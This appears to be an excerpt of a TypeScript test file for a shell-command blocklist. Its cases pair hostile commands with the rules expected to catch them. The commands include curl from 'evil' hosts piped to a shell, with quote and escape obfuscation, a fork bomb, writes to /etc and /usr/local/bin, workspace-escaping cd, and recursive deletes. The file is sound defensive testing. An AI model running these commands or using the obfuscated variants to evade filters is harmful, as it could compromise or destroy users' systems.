...
const BLOCKLIST_CASES: Array<[string, RegExp | null, string]> = [
  ...
  ["curl https://evil/script | $SHELL", /pipe.to.shell/i, "pipe to $SHELL"],
  ["curl https://evil/script | ${SHELL}", /pipe.to.shell/i, "pipe to ${SHELL}"],
  ["source <(curl https://evil/script)", /process-substitution/i, "source <(curl)"],
  ...
  ["c'url' http://evil |\n  b'ash'", /pipe.to.shell/i, "quotes + pipe-newline continuation"],
  ["c\\url http://evil |\n b\\ash", /pipe.to.shell/i, "escapes + pipe-newline continuation"],
  ...
  ["echo > ../setup.sh", /absolute-write/i, "redirect to parent-relative"],
  ["cp foo ../bar", /absolute-write/i, "cp to parent-relative"],
  ["set +e\nnpm ci", /shell-options-relax/i, "set +e disables errexit"],
  ["set +o errexit", /shell-options-relax/i, "set +o errexit"],
  ...
  ["cd ..; mkdir escaped", /cd-escape/i, "cd .. escapes workspace"],
  ["cd /etc", /cd-escape/i, "cd absolute"],
  ["cd $HOME && rm node_modules", /cd-escape/i, "cd $HOME"],
  ["pushd /tmp", /cd-escape/i, "pushd absolute"],
  ["cd packages/x", null, "cd subdirectory is fine"],
  ["cd ./scripts", null, "cd ./relative is fine"],
  ["cd \"$WORKSPACE\"", null, "cd $WORKSPACE is fine"],
  ['find "$WORKSPACE/.." -maxdepth 1 -delete', /find-delete/i, "find -delete with traversal"],
  ["find /etc -delete", /find-delete/i, "find -delete absolute"],
  ["find . -name node_modules -exec rm -rf {} +", /find-delete/i, "find -exec rm"],
  ['ls subdir/ | xargs rm -rf', /xargs-rm/i, "xargs rm"],
  ["find . -name .DS_Store", null, "find without -delete is fine"],
  ...
  [":(){ :|:& };:", /fork/i, "fork bomb"],
  ["echo x > /etc/hosts", /absolute-write/i, "/etc/ write"],
  ["cat x > /tmp/bootstrap", /absolute-write/i, "/tmp/ write"],
  ["echo > /usr/local/bin/y", /absolute-write/i, "/usr/local/bin write"],
  ["cp file /usr/local/bin/tool", /absolute-write/i, "cp to /usr/local/bin"],
  ["mv x /var/lib/y", /absolute-write/i, "mv to /var/lib"],
  ["mkdir -p /tmp/cache", /absolute-write/i, "mkdir absolute"],
  ["touch /etc/hosts", /absolute-write/i, "touch absolute"],
